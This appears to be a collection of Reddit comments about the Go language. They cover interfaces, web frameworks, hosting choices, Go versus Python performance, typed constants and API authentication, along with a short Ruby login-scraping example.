Upvoted you for being correct. :D
Bolt or Tiedot has been suggested. Version 2!
My attempt from last year: https://github.com/justincampbell/url-shortener-go
A PR was submitted and the latest version is now free of Gorilla Mux
Docker is affecting my mind into using Env as settings :)
It's a really boring talk. 
https://talks.golang.org/2013/bestpractices.slide
There you go: https://www.youtube.com/watch?v=8D3Vmm1BGoY
Since `http.ListenAndServe()` only returns if there's an error, I usually just do log.Fatalln(http.ListenAndServe(....)) That way if it *does* return it an error, it'll get logged and the program will exit, which is usually what would happen anyway. 
Nope, GOMAXPROCS defaults to 1, so this is sensible.
Thanks, I don't have time for a 45 minute video, but this gave me an rough idea what he was talking about. 
This is a usual practice in network protocols. When communicating, say, over a socket, there are just bytes going through the network: no types, no lengths, nothing. If I sent you `Hello` and then `World` on the network, you will have no way of knowing how many messages that was. Was that `Hell`, `o` and `World` maybe? You have to somehow mark the message boundaries yourself. Sending a string length followed by string contents is usually how that's done for strings, another popular method probably being sending NUL-terminated strings.
Nice tip on Linux VFS issues, thanks. And you're of completely correct regarding locking. To my understanding, one shouldn't generally use `flock(2)` for this reason. Nor do most non-NFS filesystems handle locking at all, in addition to the multitude reasons to avoid using locks on NFS. Not, of course, that the shortener is using any kind of file locking whatsoever, which means there's race conditions even on a local filesystem.
tl;dr : Simplicity, simplicity, and simplicity. And concurrency. (when writing in Go)
If you're using gorilla for regex in mux alone, it might be worth comparing it to a roll your own where you're "routing" conditionally through various functions after the initial route to "/" is done. I haven't poured through the source of Gorilla's mux to know how they do it, but my hunch is it's probably pretty similar and there would be negligible net benefit. But it may well be overkill for simple routing, so if this were a more serious project it might warrant comparison.
I don't understand why/how it's used by so many function, what is it useful for? Also, [slide 20](https://talks.golang.org/2013/bestpractices.slide#20) I didn't understood why would you accept the writer interface. Maybe there's a exercise about this interface I could do? Or more info about what this interface do. (not sure where to search a particular interface)
And if you'd like much more explanation of that, [I had some thoughts a while ago](http://www.jerf.org/iri/post/2923).
Hey, sorry jumping on the criticism wagon! It was actually quite a childish comment. I didn't watch the whole thing so I can't really say whether it was entirely "boring" or not. It was just a bit basic, but saying that it might just be because Go is such a simple language! 
How do you protect against collisions though? Unless I'm mistaken, the code *could* generate a 7 char sequence, albeit highly unlikely, that already contains a value in redis Or is the SET operation in redis a one time only thing? 
ReadWriter is just Reader and Writer combined. Lets you refer to both of those interfaces without creating an intermediate interface in every package you create. Now, to justify creating Reader/Writer interfaces. Think of all the scenarios where you expect to receive (or supply) a sequence of bytes: files, network connections, external devices... At least a handful. That enough is a good reason to create a standard interface. Moreover, unifying the API is a good thing. Imagine having: * `Read(s []byte) (int64, error)` for files * `Recv(n int64) (s []byte, error)` for sockets * `Get() []byte` for USB devices etc. Having standard interfaces, any piece of idiomatic Go code will try to behave according to them (at least where it makes sense). Moreover, interfaces are great for testing. Say, your function takes a file and reads it. Creating temporary files in tests are messy. Just rewrite your function to take an interface type (io.Reader, in this instance) and supply something that implements it, but is easier to construct ([bytes.Buffer](http://golang.org/pkg/bytes/#Buffer)?).
The interface looks fairly easy to implement, it would probably only take a day or so of work to replicate. As an aside, I think this is the first GPLv3 licensed Go software I've seen.
If you also need a server lib: Go-Relax is MIT, aims to be full-featured and truly RESTful - http://github.com/codehack/go-relax
It's boring because you keep meandering and not getting to the point of what you are saying. Edit: I made the above comment after viewing the video again to try to analyze why it was so boring. I saw the downvotes for this comment, so I thought maybe I was wrong, so I went back and watched the video again. So that is three times now. And my opinion did not change. The talk is completely unfocused and the speaker is meandering from one topic to another. If you want people to keep listening, don't keep on adding more and more distracting notes to what you are saying. Focus on the message and make it clear. 
&gt; I've heard bad things about Heroku's uptime. [Heroku's status site](https://status.heroku.com/uptime) shows 99.97-99.99% monthly uptime in the US region. [GAE's status site](https://code.google.com/status/appengine) doesn't appear to provide comparable stats; the current availability figure was 98.90% when I started typing but is 100% now. &gt; which has the wonderful `goapp` command to manage everything Heroku has the [`heroku` command](https://toolbelt.heroku.com/) to manage everything. &gt; Why not use Google App Engine Google App Engine runs your app in a sandbox. GAE apps are forbidden from interacting with the outside world except via the `appengine/*` libraries, and if you can't do it through `appengine/*`, you can't do it. GAE apps run on Google's servers, or you can run it anywhere else – provided you're willing to a) run it within the App Engine SDK or b) port your code out. Heroku runs your app in a container. Heroku apps can do whatever they want on the network and the local (ephemeral) filesystem. Use `net/http` and friends. Use whatever external services are appropriate; pick an addon to run it or run it yourself in EC2. Link against all the libraries all you want, native code or otherwise. Heroku apps run on Amazon's servers, but your code can run it anywhere else without modification. So, one reason: vendor lock-in.
An addition, if you want to avoid allocations for different sorting types (I think), you can just do like: type PersonCollection []Person type personByName PersonCollection because the [type identity](http://golang.org/ref/spec#Type_identity) is identical. Such as in this demo http://play.golang.org/p/Xk0RdD7w1z
&gt;because you don't need the Reader portion of the ReadWriter interface That's the part I understood. (The one I didn't is why accepting a Writer interface instead of a os.File struct makes Testing easier) But, you're right I've never checked what actually define the Read interface. Now I'm still a bit confused but I can now ask this question : why accepting anything that implement the Writer interface makes testing easier? For me, the pro of accepting an interface is that the function can now write to anything that implement the writer interface, the cons are that maybe you don't want your function to be used on anything else than a file. But maybe it's false? Another advantage (if I understood the writer interface correctly) is that it also tells us how many bytes were written. Is it useful for anything else than when there's an error? (or checking if there's an error) Edit : got confused again I don't understand how to use these interface. Simple thing : I don't understand why both reader and writer accept data([]byte).. I'm okay that reader reads what you give him something, but shouldn't writer accept uh.. a io.reader and it will give his data by calling Read().. No, not at all? :( More concrete confusion : [buffer](http://golang.org/src/pkg/bytes/buffer.go?s=8109:8159#L241) Read() and Write() both take the data and store it. I don't see any difference except it stores them in different places of that buf slice.. How do you get the data out of a readerwriter? If it was me I'd replace Write() by Writeto() (except write.to, write to a writer.. hmm.) I'm truly lost, I'm going to bed and hopefully it all make sense in the morning. Edit2: pff, Write to send, Read to receive.. nothing else.
(I'm stupid, I replied to one comment before reading the others) I don't have really have any question, but even if I start to make sense of it, I need to write something that uses it, or it'll still be something.. quite abstract. I also never used []byte before seeing this interface, that added to the confusion. Thanks for all the answers! ([this](http://golang.org/pkg/bytes/#Buffer) also helped me understand read an writer interface. It also seems like a cool thing to use in programs)
If you are sorting by multiple criteria, then you can use embedding to only implement Len and Swap once: http://play.golang.org/p/XiKNxMF5he
It does not. I wanted to see if Go can be as succinct as Scala, so I kept the functionality identical.
Saving
I've installed this on W7; I always get a "Format Tool (goimports): Not Found" message when launching Atom.
&gt; Please do not publish your code or make it available to future 6.824 students -- for example, please do not make your code visible on github. KEEP IT SECRET, KEEP IT SAFE.
it would mean the professor would have to do significant work to modify the course every semester and we wouldn't want them to have to do much extra work outside of research ... I do love MIT open courseware however.
Anything involving: non-trivial concurrency, type safety, ease of deployment, and parallelism without C bindings. 
Much better resources available via their github page: https://github.com/cmu440 The PDFs for the projects are available in their repositories.
I think it would be pretty hard to find something where python outperforms go.
Go will beat the ever-lovin' tarnation out of Python performance on day-to-day things (20x - 100x, and I am not kidding), but for the stack you just described probably can't provide enough advantage to make it worth your time. Go is not a great solution for scientific computing right now, and it's hardly worth switching bindings for small gains.
Well -- a lot of the magic of Python for scientific computing is C. It is the C libs that make it usable. Go will stomp the Python bits for performance, but if all your times is spent in NumPy, it doesn't matter. Go is catching up in this regard, but is still a a bit away from being a fair fight. 
You're pretty much going to use C libraries to do those calculations in Python or Go, so might as well use Python because people have already written all the wrapping libraries.
Thanks! I didn't know about this wiki page.
With `net/http`, you will find a light web stack which is incredibly performant and production ready. You will almost certainly have way lower latency and be able to handle far more requests per server than a Django stack. That said, depending on how much Django you use, you might have to do a significant amt of work yourself which gets provided for you currently. As for the other parts of your stack, as /u/robertmeta says, most of the scientific computing stuff in Python is actually C. Python's C API, while more difficult to deal with than Go's (in my opinion), has a few advantages. You can allocate Python objects directly from C, whereas using C from Go requires either lots of copying or some delicate uses of `unsafe` and `C.free`. In my experience, things in Python like `gzip` and various hash functions outperform their Go counterparts: generally by about 10% for cgo libraries, and 100% for pure Go libraries. Despite that, I'd suspect that your Go programs will behave much better, utilize more CPUs, use less memory, have less bugs, and be much lower latency.
Don't use your project directory as GOPATH...
Nice one mark! Simple introduction to testing that doesn't need Wikipedia in another tab
I don't use python, so this I'm not 100% that this is the way that mechanize is used, but here goes. Looks like the main purpose of mechanize is to test server-side code by pretending to be a browser. Go provides the package [http/httptest](http://golang.org/pkg/net/http/httptest/), which provides useful types and methods for mocking a browser in tests. [Andrew Gerrand gives a good talk about how to use it here](https://talks.golang.org/2014/testing.slide#13) - the part about httptest is a few slides in, but if you're new to testing in Go, it's a good place to start.
not exactly for testing, I use it for site parsing. here is small example for mechanize (in Ruby, but it is similar to Python) require 'mechanize' agent = Mechanize.new agent.user_agent_alias = 'Windows IE 9' page = agent.get("https://www.odesk.com/login") login_form = page.form_with :id =&gt; "login" login_form['username']='xxxxxxxxxxxxx' login_form['password']='xxxxxxxxxxxx' results = agent.submit login_form puts results.body After login, cookies processing and all redirects I receive my odesk home page How can I do it with Go so easy?
You could use an http.Client (from [net/http](www.golang.org/pkg/net/http). To set the user agent, you just need to do something along the lines of: client := &amp;http.Client{} req, err := http.NewRequest("GET", whatever_url, nil) if err != nil { // handle error } req.Header.Set("User-Agent", "user agent goes here") Source: [StackOverflow](http://stackoverflow.com/a/13263993)
Anyone know if there is a reading list? I'm curious what materials they recommend for picking up go.
I recommend http://dave.cheney.net/resources-for-new-go-programmers
Yep, I lack any experience with google code issue tracker, so I assume you are right, but on the other side everything else mostly code browsing, commit review, comparing branches, diffing etc seems more sophisticated on others platforms. Anyway probably it's easy to resolve with a mirror. So, just bike-shedding :D
*great post!*
I didn't know that, but the problem isn't that the answers are wrong, but are obsolete, they're not the best answer. And it's more about libraries that changed. It's more noticeable in question that asks how should you do something.
I don't think this is happening as much as you're implying. Answers relying on specific libraries no different from other languages. Answers relying on the std lib should almost never be obsolete, especially given that most SO questions don't revolve around edge cases/unspecified behaviour.
Obviously I've lost the question that originally pushed me to make this post, but [this one](http://stackoverflow.com/questions/2416305/looking-for-go-equivalent-of-scanf) is the kind of question where I think "is there a better equivalent _now_?".
Not necessarily. Go idioms and design patterns are still being developed. It's easy to make something that answers the question, but it's another thing to have an answer that's well designed for Go.
To be fair: the question there was asked **well** before Go hit version 1 - over two years before (Mar 10 2010 vs. Mar 28 2012). The same would apply to any "new" language in this case - Rust, Julia, Clojure, et. al - where development was in the open.
Would anyone working through this course like to discuss it?
&gt;The same would apply to any "new" language in this case - Rust, Julia, Clojure, et. al - where development was in the open. I totally agree with this. (And I didn't realize Go v1 was _that_ recent!) 
Author here, threw this together today for a project and have found it quite useful for a couple of things so turned it into a library. Feedback welcome! Also, I incorrectly stated it is a mutex, but unable to edit post title.
I understand that we can't do much about it, I was just saying that it's _a little bit_ harder to find idiomatic answers on SO. And since I like reading about people's question to learn, it can be problematic for me..
Thanks for this! I've been a big fan of WWW::Mechanize in Perl as well as it's Ruby equivalent, so I'm pretty sure I'm going to find a use for the golang equivalent.
Looks nice! Have you thought about expanding your project to make it an implementation of [Token Bucket Algorithm](http://en.wikipedia.org/wiki/Token_bucket)?
I have made a pure-go TB implementation, comments / reviews welcomed. http://godoc.org/github.com/apokalyptik/gotb 
No problem, it was fun to work on. Hopefully I'll have time to keep working on it, although I'm not 100% sure what the use case is for a library like mechanize. Automating form submissions to sites which don't provide real APIs? I'll have to look more at WWW::Mechanize as the documentation on the Python lib is a little light and messy. It was hard to get a feel for it's usage.
This looks great! I'm about to use it in one of my projects already, but I have some suggestions even before I start: * Putting "go" in the package name is a bit weird. I'll be importing it as `surf`, and this might make a better default package name as well. (This would also mean putting everything into a new surf directory in your repo so that the last element of the package path matches the package name.) * Maybe you could support javascript using [otto](https://github.com/robertkrimen/otto)? There's already a project that uses it for server-side rendering [here](https://github.com/101loops/go-reactjs). I'll probably have more feedback, and possibly pull requests, once I actually start using it.
I'm not in love with the name GoSurf at all, but the understated "Surf" might be a better choice. I was thinking about JS integration by creating Go bindings for Google's V8 engine, but I'll take a look at otto. Something already written in Go is a plus. I also need to add an attribute to have the browser download the page assets, eg images, stylesheets, scripts, etc.
I had this problem in college for a compiler course. I wrote a compiler and the professor asked us not to publish it. You're kidding right? I just wrote my first LL(1) parser(recursive descent), compiler, register allocator (graph coloring), and peephole code optimizer and you think I'm not going to put it on github and incorporate it into my "portfolio"?
Nice job! Glad to see something like this!
Perhaps you should look into Julia http://julialang.org/
now I will expect to some make amazing examples written in go
Can you please log an issue at https://github.com/joefitzgerald/go-plus/issues?
Many numpy operations release the GIL.
Holy shit this is ridiculous.
It seems to be labouring to explain something quite obvious. const x "xyz" is like #define x "xyz" in C. I don't think there's any more to it than that, except for the type safety bits. 
I'm sorry but who? what? why? A pointer to a couple of github projects, and a very tedious website where I have to press "continue" every time I want to read the next sentence. I bet Gopher Ben Johnson is great but please tell me why I should care. 
I like the fact that questions made this interview a good read for beginners.
In Go const a=44444444444444444444444444444444444444 const b=2222222222222222222222222222222 var i int = a/b yields i == 20000000 Trythis with defines in C
Care to explain why do you think so?
this. so much. I'm coming from working with Symfony. Seems like everything i would normally do in php/Symfony isn't "idiomatic" go or just plain won't work.
Because it's awesome! It's such a genius and elegant way to work with numbers and the type system.
I think all of you don't understand the point of a stability promise, which is that the same code will compile in the future and continue to work as before. This precludes having to fix anything, neither manually nor automatically.
Try https://github.com/gosexy/rest, it's MIT licensed.
I agree. Too bad other redditors are quick to judge (and downvote). Oh well, those internet points are useless anyway.
Why is the **x** constant literal printing ASCII value of 120 ? Is that because of single quotation? Double quotation treats it as **string** !
What are you talking about?
\`x` and "x" are strings. 'x' is a rune. Since the underlying type of 'x' is int32 and Printf takes an interface I think it takes the underlying type. When I call the function with rune('x') it also return int32. At least that's what I think is how it is supposed to work. 
Haha yeah I'm not worried - and in retrospect my comment could be interpreted as me being a dick, and definitely has no context.
I'm talking about "An Interview with Gopher Ben Johnson". It's an interview with "gopher" called Ben Johnson. Helpfully, you can find a link to the article at the top of this page. 
 func (yourType) DoSomething() { // ... }
Please don't name a package go-foo. If the github repo needs to be go-foo (why?), then make a new subdirectory named "foo", so the import is "github.com/you/go-foo/foo" and the package is foo. But really, just don't use go-foo. 
It is good to know that this is looked down upon. I have seen a few packages around GitHub that start with a `go-` prefix (which is why I included it), but I can understand that it is completely unnecessary.
Just a shorthand version of the type name—what you have now with "f" for Factory and "p" for Parcel — is about right. It's common to use short variable names in Go in local contexts because it's then obvious what it is, and easy to check (it's probably only a few lines up).
In strings.go, it seems like you could avoid nesting so many condition. I'm not an expert at all, but instead of if tag != "" { //do more checks do if tag == "" { continue // start the loop again } // other checks I'm not sure if it's a good suggestion, but at least it would avoid hitting the right border.. :) Also maybe you can use a switch to identify the value's type, but that won't change much. Nice first package anyway! 
What do you mean by "secure"? 
That's a big question. Would recommend using a standard method instead of rolling your own. Think OAuth 2.0 (the Osin package is very good) or use a gateway like Tyk.io (disclosure: I wrote that).
Why is that? "self" clearly identifies it as the type the method operates on whereas, say, the first letter of the type's name could be many things.
Search for **HMAC** Also used by Amazon
This is the right way to do it. An acceptable alternative is to use HTTP auth + SSL. In either event, do not attempt to implement either from scratch unless you are a security professional and know ~~something~~ *a lot* about cryptography. 
Using "this" or "self" as the identifier for the receiver is about as informative as naming interface types Isomething. 
In addition to what's already been mentioned: * In most cases I prefer to use named returns purely for documentation e.g. func (*JsonCodec) Encode(rw http.ResponseWriter, r *http.Request, candidate interface{}, code int) (written bool, err error) { if r.Header.Get("Content-Type") != MimeJson { return false, nil } rw.Header().Set("Content-Type", MimeJson) rw.WriteHeader(code) return true, json.NewEncoder(rw).Encode(candidate) } Another case I saw was `err = &amp;StringsDecodeError... return`. I believe the compiler will throw an error if you shadow the return param, but I think it's both easier to understand and type `return &amp;StringsDecodeError...` * I'm not sure if `golint` or `go vet` will pick this up, but the documentation for `func Query() *StringsCodec` seems to be talking about the wrong function `QueryDecode` * In the documentation for `type QueryStringer`, missing a word: *implementation* **of** and I think *strings.Stringer* was meant to be *Stringer* * Minor thing to be aware of: when you call r.URL.Query(), it parses RawQuery every time * Much of the documentation is broken into multiples lines only after a few words for no apparent reason * Perhaps the name `Strings` isn't the best name. It doesn't seem to have any meaning, and the documentation reflects heavily on that. *Strings returns a new configured Strings* doesn't tell me anything... and I think it's talking about the wrong type. *Strings returns a new configured StringsCodec* would be a little better, but I think it's simply stating the obvious (given the return type) and says nothing about the parameters. In this case I'd think about whether or not there needs to be a factory function at all. * I think the naming's been brought up already but just a reminder: I'd write `s Stringer` instead of `stringer Stringer`. The word `stringer` adds nothing except stuttering * Someone already mentioned the nesting. I'd also replace `if .. else if` with a switch e.g. switch kind { case reflect.Float32, reflect.Float64: } * There are several cases where you check `Content-Type == Mime*`. I'd probably parse the content type with `mime.ParseMediaType` because I think it's perfectly reasonable for a client to send me data with a content-type with params like `application/json; charset=utf-8` * Minor nit: I'd use *JSON* instead of *Json* and *XML* instead of *Xml* More info here https://code.google.com/p/go-wiki/wiki/CodeReviewComments
I agree about not rolling your own here, but my first thought would be Oauth 2 over HTTP auth. I guess this all goes back to the 'What do you mean by "secure"' question.
Or rather, how is the API used? If it's client side, then a HTTP only cookie could do (preferably over HTTPS). I'd suggest you look into CSRF and use an anti-forgery token if possible. You should also setup CORS correctly. If it's a back-end service, I'd suggest going the HMAC route to protect against MITM attacks with an added timestamp or/and nonce you can use to stop replay attacks. Here's a nice example: http://www.wolfe.id.au/2012/10/20/what-is-hmac-and-why-is-it-useful/
Okay, good. That all makes sense. I changed it shortly after /u/davecheney made the suggestion.
Basically (although rune literals have a default type of rune, which is distinct from int32, and it's not ASCII, which is why you can have '世', etc.). If you want the character, use `fmt.Printf("%c", 'x')`.
&gt; I agree about not rolling your own here, but my first thought would be Oauth 2 over HTTP auth. It depends on the use requirements. Machine-to-machine? HTTPS authentication or some kind of token ID (like above); provided you guard that secret, naturally. User-to-machine? OAuth would work well if you want to leverage someone *else's* security scheme and/or password storage. &gt; I guess this all goes back to the 'What do you mean by "secure"' question. Indeed.
&gt; API Rest *shudder*
The fact that fashion-followers and startup simps are flocking to Go doesn't particularly encourage me. Node.js was always obviously a huge sack of dog-poo, and people who made the decision to use that probably don't have great judgement. Now the same Node.js nitwits and the PHP prats are flocking to Go? Great news, or just an indication that Go is the latest programming fad, for the next few months or years? 
Why would it matter? Being a nit-wit or prat isn't contagious; it doesn't spread to all people using the same language. If you decide that Go is for you just because all the cool kids are doing it, then you've made a bad decision. But if you decide not to use it because all the cool kids are using it, you've made an even worse one. So stop worrying about other developers (and stop calling them names -- it just makes you look bad). Instead, pick the tools that fit the job.
Very well said
&gt; If you decide that Go is for you just because all the cool kids are doing it, then you've made a bad decision You haven't necessarily made a bad decision, you have made a decision for the wrong reason. But the decision may or may not be bad. Edit: So I'm being downvoted for saying that choosing Go may not be a bad decision? Downvoted by Go-haters, or did Go Fan-Boys not even read what I wrote before downvoting? Hilarious. 
I have to say that I think container/list is *just* useful enough to be worth having. For a singly-linked list, I agree - it's not worth it. But for a doubly linked list such as provided by container/list, I find myself needing to think too hard about the pointer manipulations involved. It's quite easy to get wrong, but it's a useful data structure to have to hand. For that reason, I think container/list still has its place. By the compositional nature of Go programs, it's usually easy to swap it out for a custom structure when/if that proves necessary (at least, it is in the 3 or 4 places I've actually used it so far). It's a beautifully elegant implementation too, just exactly right for what it tries to do. Conversely, there have been a few occasions that I *really* wanted to use ring.Ring, but it never quite worked out. In the random selection of 3514043 lines of Go source code I happen to have in my $GOPATH (I don't delete packages) I don't see a single real use of it. Again though, it's a lovely piece of code, worth leaving in as a historical artifact in my view. It's so small and well defined, it need never change. If we ever work out a worthy generics scheme, all this stuff will be easily replaced, and we shall Tastefully Use Generics. 
I've only fiddled with node.js but I thought Promises is the solution to callback hell (or callback soup)?
You're at zero points after two hours, your self-pity edit is not helping your case. You're not a victim, your point of view isn't being oppressed by "haters".
They do. And it's not particularly hard to define non-anonymous functions that can be used as callbacks without cluttering up a random method with callback code.
That's what I thought. 
It may be a bad decision if it was made with the wrong reason anyway.
How does the compiler work with constants in the "pure" number space? Does it use an arbitrary precision math library?
Hi. Nice lib! I wrote one using a single channel. Just throwing it into the mix. Thoughts welcome. https://github.com/jasonmoo/grate/blob/master/grate.go
I was cringing through a lot of this talk... I mean good for them for rearchitecting their app to suite their needs, and choosing a language that works for them. But this talk showed more about what happens when your dev team is inexperienced, rather than actual benefits of one language over another.
I used container/ring for https://github.com/dgryski/go-clockpro because I wanted something with O(1) element moves and also the logical overhead of keeping track of all the different indices and modulos and whatnot was very obnoxious. 
You've been downvoted for being pedantic. Be a little more forgiving of inexact language in a random forum on the internet. 
It's a trick/dirty hack, not a recommendation :) I'd personally host it directly or use NGINX instead. My recommendation would be if you need to host Go apps together with ASP.NET/NodeJS apps on Windows; setup a Reverse Proxy rewrite rule in IIS and 'host' the Go app inside a Windows service.
Love this project! Very clever to leverage other awesome storage engines like leveldb, boltdb, lmdb, .. for persistence over a redis-compatible interface. Especially when Redis' persistence model isn't an ideal fit for a particular data set (ie. the entire set of data doesn't fit in memory, and disk persistence is more then dumping to an append log). 
No it's not. At least, not always. Anyway, I for one don't like the idea of anonymous fuckers deciding what I should and what I shouldn't see. That's why I sort comments by novelty (not by popularity) and have disabled low-karma comment collapsing feature.
Signals/events/whatever-they-are-called seem like a good way, at least to me. Some ORM libraries, including [gorm](https://github.com/jinzhu/gorm), which I prefer, have them built-in.
i've looked at gorm before. I don't like the fact that the callbacks are methods on the objects themselves. I'd either have to inject the services the callbacks need in every domain object(yuck) or make those services globally available, also yuck and hard to test. I'm used to wiring these things up through a dependency injection container which isn't idiomatic Go :( 
It is. However, it's not all roses. - You must always remember to use `done()` at your topmost-level promise. Otherwise Bad Things will happen. - Many libraries continue to only support callbacks or `EventEmitter`. For the former, you can usually `Promise.promisifyAll()` your way to a better API, but for the latter, or for some API that's unconventional in some other way, you're going to either need your own wrappers or find someone else's like [q-io](https://github.com/kriskowal/q-io). - Each `then()` is its own scope, which means if you compute something in step 2 that you need in step 8, you're going to need to pass that variable along somehow to the scope you need it in. Either you use `Promisify.all()` to split your problem into two parallel tracks, you use `Promisify.all()` to pass a variable down the chain as you do your other async task, or you put a variable in the parent scope and assign to it later in your `then()`. Still...it's better than callback pyramids or async.
The domain object injection seems to be the way to go. Take a look at the recommendations for passing db connections around. Create a struct that is a bucket (perhaps, call it a repository) that holds all the necessary callables and then call them when you need to. 
This is why i wrote the [async-you workshop](http://nodeschool.io/#asyncyou)
You can use something like this, but it's ugly: type Events struct { m map[string][]func(interface{}) error l sync.Mutex } func (e *Events) init() { if e.m == nil { e.m = make(map[string][]func(interface{}) error, 4) } } func (e *Events) On(name string, fn ...func(interface{}) error) { e.l.Lock() e.init() e.m[name] = append(e.m[name], fn...) e.l.Unlock() } func (e *Events) Fire(name string, val interface{}) (err error) { e.l.Lock() e.init() for _, fn := range e.m[name] { if err = fn(val); err != nil { break } } e.l.Unlock() return } type Saver struct { Events //other stuff } func (s *Saver) ServeHTTP(rw http.ResponseWriter, req *http.Request) { s.Fire("save.pre", req) //stuff s.Fire("save.post", req) } or make a global events instance and use it.
Redis?
for in-app event handling?
Most of the things mentioned in the original post should probably not be done in-app though. e-mail? facebook? Those sound like perfect candidates for separate services with work queues and reliablity – remains statsd, which can frankly go directly into the function and doesn't need an elaborate event/decorator/whatever abstraction that complicates things. Do the basic things in the function, fire an inter-process event for the expensive things.
This was just a train of thought thing... so forgive any typos and such. Avoid castle building. Over-engineering is deceptively simple to fall into. At each point, do the simplest thing that will work. Simplicity spans two often conflicting goals: simplicity of implementation and simplicity of use. Don't optimize for one at the expense of the other, try to find the sweet spot. Onto your mock requirements, if I needed to (1) send an email, (2) send a stat to StatsD, and (3) post to FB -- on the TaskManager.Save... my first question to you would be -- does failure of these invalidate the transaction? Lets assume they do, which effectively makes this a blocking transaction because it hasn't "finished" until these long running externally controlled events have finished (or timed out), so a failure in one of these 3 events should be returned as an error. So, would I build a hooks system? Probably not, it is flexibility I don't yet need, it creates a lack of clarity and explicit costs (I now can't look at .Save and understand its costs or even what is happening, black voodoo magic could happen in pre/post_save), and it doesn't gain us very much. For your requirements, I would write three blocking functions, one to do each thing you need... SendEmail, SendStats, PostToFacebook... each one will block and take a timeout value. Then right in the Save function, I would call them... MVP done. It is correct, it fails the right way, you can obviously see what is going on right in front of you, and you can easily return a sane error to your caller. Obviously, the first concern would be that they run in sequence rather than concurrently, lucky that isn't hard to fix with goroutines. But, now I am considering adding more than 3 additional lines to .Save, and would take a moment to consider if the code belongs here. As I know of no other function that requires these three things, I would most likely decide that the code can still be inlined and put it in the function, likely bloating our .Save function up to around 30 lines. But 30 explicit, very understandable lines. I would probably put a XXX or TODO comment about this getting a little bloated, and questioning if I should move the various calls into their own function. 
&gt; I tried to implement this idea in Go and asked the irc channel what they thought and i got blasted for it not being idiomatic Go. Everyone kept asking why i needed to do those actions. I don't think they understood that they were just arbitrary examples. You need to understand the problem before providing the solution, otherwise you can end up with accidental complexity, poor solutions, too much wiring etc. You need to start and understand the actual problem you are trying to solve. Anyways: http://play.golang.org/p/A4QagXXlR1
Wow, that was difficult to read with `every` other `word` being `differently` styled.
This is what i was looking for. Thank you thank you. Gophers have been telling me my plan was too complex, abstract, etc but i haven't been getting much about how to go about fixing it. My only concerns about the above approach would be when i was trying to write tests for my code. If everything was directly inside .Save, i couldn't mock anything and couldn't really test it. Thoughts?
i guess i'm jaded. I work in a place where requirements are constantly being added so designing a system that's easy to extend has been a top priority. 
Cool post. Some quick comments: * You can use a 'chan struct{}' for done if you're not actually reading a value from it. * Your goroutine can simply close(done), which unblocks all readers. * You could avoid the goroutine altogether by using a buffered output chan.
It's hard to suggest something without knowing the actual domain, the needs of the customers etc. But, take a look at CQRS + Event Sourcing... it allows very loose coupling of different systems... but it can be an overkill in a simple domain (i.e. CRUD systems). (note, I do not have a nice example in Go to show, although I'm close to one...)
Btw. there are some interesting projects: * [gogits](https://github.com/gogits/gogs) * [Camlistore](https://github.com/bradfitz/camlistore) I haven't taken a through look of gogits, to say whether it's a good approach or not... but it seems quite good example of a CRUD app.
Go already has [termbox](https://github.com/nsf/termbox-go) to replace ncurses and [git2go](https://github.com/libgit2/git2go) for a git interface. I don't know exactly what BGL provides but I know there are Go projects dealing with graphs. I want a pure Go UI toolkit. Go is actually an acceptable language for UIs finally, but I want that cross-compiling magic for my desktop projects.
simple go package. for learning purpose. criticism are wellcome :))
I'd like to see a GUI package as well but seeing the pain that andlabs goes through with his UI package, I don't know... I hope he succeeds in rewriting it but I kind of renamed my hope onto the qml package although I never liked to work with QT applications..
I'd love a more more complete gtk binding.
media related libraries like ffmpeg &amp; imagemagick
The [linked to blog post by Rob Pike](http://blog.golang.org/constants) a few days back goes a lot more in depth (but is inherently longer). Very well worth a read.
It's incredible how such a simple stuff like enumeration becomes so intelligent and elegant in Go.
Even though I love the name, it wasn't the smartest decision when it comes down to SEO and searchability. That said, I've been working w/ Go for years and I never had problems finding anything when using Golang or "go language". Your concern is definitely valid, but the project will likely not be renamed.
People who are interested in you finding them by random chance will include the tag golang as metadata to help the search engine out. This is a non issue, you can search for C just fine. Hell even C++ and the distinction between the two works OK. 
What confuses me more, is that most (if not all) of books about this Go language, refers this language as "Go". Google "Go books", cannot find them. Google "Golang books", only return some books about Go language. The only one can help is only amazon in books section, you search "Go", it returns all of the Go language books on sale (but still convoluted with many things unrelated). Do amazon sells video tutorial/audiobook about Go the programming language? I can't find them. When I try to google for "Go video" or "Go tutorial", well, then it always starts to get me headache.
On the other hand, I was looking for information about the snake and all I got was information about some people's favourite programming language. Edit: decorum. 
[Gift](https://github.com/disintegration/gift) has a lot less features but it could replace imagemagick.
I'm here talking as a Golang beginner, moving from python and ruby, because I'm starting to love this Go language. Maybe experts like you won't have any trouble on finding them. But for beginners, we need to attract more and more devs to use Golang.
I've never had a bad experience on searching "python books" or "python videos" or "python tutorial". They will always return the right thing.
Seriously? This is just stupid. It offers little value over simple enums, and just serves to make go that much harder to learn and read. 
I have an issue with the name "Go" as well. It does make it harder to search for, and as you mentioned - you'd think a company like Google would know this prior to naming a product, language, etc. This was the same issue when Microsoft used ".NET" in the early 2000's. .NET made it very difficult initially to search for jobs, articles, etc. as did (to a lesser degree) "C#". Over time the search engines got better as did the job sites, but this could've been prevented. I like Go, I also just wish it had been named better.
This. If you remove the anonymous Job member from your struct, you'll get the compile time error you expect. This post helped me understand Go interfaces: http://jordanorelli.com/post/32665860244/how-to-use-interfaces-in-go 
I saw a picture of a python here and was wondering if it was venomous or not. I searched and this is what I got: https://duckduckgo.com/?q=python Yikes. 
[moviepy](http://zulko.github.io/moviepy/) (video editing) and [Pillow](https://pillow.readthedocs.org/en/latest/) (image editing) from Python. 
First of all, glad I could help. A lot of time when you hear "too complex, too abstract" ... add an additional phrase to help you find the issue "too implicit". Idiomatic Go is about explicitness, even if it means more verbosity and more code, it is about avoiding black magic and hidden costs. So a wild new requirement emerges, you want to do partial/incomplete testing. Not sure I agree, as something is either critical path or it isn't -- and if it isn't, shouldn't it be optionally called by the person who is calling .Save? I would add a comment in a passive aggressive tone to this function "So, is this stuff critical path or not... really wish I knew WTF is going on". Obviously the 3 individual calls would be independently tested with _test code. But, now it sounds like you want to mock them out of this call (again, that radically changes the call, probably removes about 99% of its cost, and a huge part of its complexity... this would break any benchmarking and forecasting you could do about the call). Additionally, any breakage as a result of interplay between these calls will also be gone... so... additionally, if you mock everything, the DB, Facebook, StatD and Email... you are really testing... what exactly? You are testing your mocking framework mostly. Anyway -- sorry -- I get ranty about people who are so busy trying to make their tests pure and see green -- that they don't actually test any of the points their applications that actually break! Look at my 5000 tests of the mocking system... as soon as the application is shipped of course it falls apart.... ugh /rant Anyway, there are a few ways to mock away these calls. Functions are first 